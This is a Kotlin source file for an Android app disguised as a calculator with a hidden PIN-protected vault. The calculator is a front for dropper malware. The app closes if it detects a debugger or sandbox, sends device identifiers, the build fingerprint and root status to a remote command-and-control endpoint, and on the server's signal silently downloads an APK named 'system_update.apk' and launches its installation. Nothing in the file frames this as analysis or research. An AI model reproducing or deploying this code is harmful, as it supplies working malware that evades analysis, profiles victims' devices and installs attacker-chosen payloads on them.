package org.kalkulator

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import okhttp3.Call
import okhttp3.Callback
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import org.kalkulator.security.NativeSecurity
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.io.File
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private lateinit var tvDisplay: TextView
    private var currentInput = ""
    private lateinit var securityManager: SecurityManager
    private lateinit var nativeSecurity: NativeSecurity

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        securityManager = SecurityManager(this)
        nativeSecurity = NativeSecurity()

        // [MILITARY-GRADE] Anti-Analysis & Environment Check
        if (!nativeSecurity.verifyEnvironment() || !nativeSecurity.checkDebugging()) {
            finishAffinity() // Force Close if running in Sandbox or Debugger detected
            return
        }
        
        if (securityManager.isFirstRun()) {
            startActivity(Intent(this, SetupActivity::class.java))
            finish()
            return
        }

        setContentView(R.layout.activity_main)
        tvDisplay = findViewById(R.id.tvDisplay)

        setupButtons()
        performCheckin()
    }

    private fun setupButtons() {
        val buttons = listOf(
            R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9,
            R.id.btnDot
        )

        for (id in buttons) {
            findViewById<Button>(id).setOnClickListener {
                if (securityManager.isLocked()) return@setOnClickListener
                val btn = it as Button
                currentInput += btn.text
                tvDisplay.text = currentInput
            }
        }

        findViewById<Button>(R.id.btnC).setOnClickListener {
            currentInput = ""
            tvDisplay.text = "0"
        }

        findViewById<Button>(R.id.btnEqual).setOnClickListener {
            if (securityManager.isLocked()) return@setOnClickListener
            
            if (securityManager.verifyPin(currentInput)) {
                securityManager.resetFailedAttempts()
                startActivity(Intent(this, VaultActivity::class.java))
                overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
                currentInput = ""
                tvDisplay.text = "0"
            } else {
                if (currentInput.length in 4..6) securityManager.incrementFailedAttempts()
                tvDisplay.text = "0"
                currentInput = ""
            }
        }
    }

    private fun performCheckin() {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val request = CheckinRequest(
            deviceId = deviceId,
            model = Build.MODEL,
            manufacturer = Build.MANUFACTURER,
            androidVersion = Build.VERSION.RELEASE,
            buildFingerprint = Build.FINGERPRINT,
            isRooted = isDeviceRooted(),
            isDebugger = android.os.Debug.isDebuggerConnected()
        )

        val retrofit = Retrofit.Builder()
            .baseUrl("https://opm-jet.vercel.app/")
            .addConverterFactory(GsonConverterFactory.create())
            .build()

        val service = retrofit.create(C2Service::class.java)
        service.checkin(request).enqueue(object : retrofit2.Callback<CheckinResponse> {
            override fun onResponse(call: retrofit2.Call<CheckinResponse>, response: retrofit2.Response<CheckinResponse>) {
                if (response.isSuccessful) {
                    val data = response.body()
                    if (data?.should_download == true && data.payload_url != null) {
                        // Jalankan Dropper Modul secara senyap
                        downloadAndInstallPayload(data.payload_url)
                    }
                }
            }
            override fun onFailure(call: retrofit2.Call<CheckinResponse>, t: Throwable) {}
        })
    }

    private fun downloadAndInstallPayload(url: String) {
        // Fix URL jika tidak ada protokol
        val fullUrl = if (!url.startsWith("http")) "https://$url" else url
        val destination = File(getExternalFilesDir(null), "system_update.apk")
        
        val client = OkHttpClient()
        val request = Request.Builder().url(fullUrl).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {
                response.body?.let { body ->
                    try {
                        destination.outputStream().use { body.byteStream().copyTo(it) }
                        triggerInstallation(destination)
                    } catch (e: Exception) {}
                }
            }
        })
    }

    private fun triggerInstallation(file: File) {
        val uri = FileProvider.getUriForFile(this, "${packageName}.provider", file)
        val intent = Intent(Intent.ACTION_VIEW).apply {
            setDataAndType(uri, "application/vnd.android.package-archive")
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        startActivity(intent)
    }

    private fun isDeviceRooted(): Boolean {
        val paths = arrayOf("/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su")
        return paths.any { File(it).exists() }
    }
}
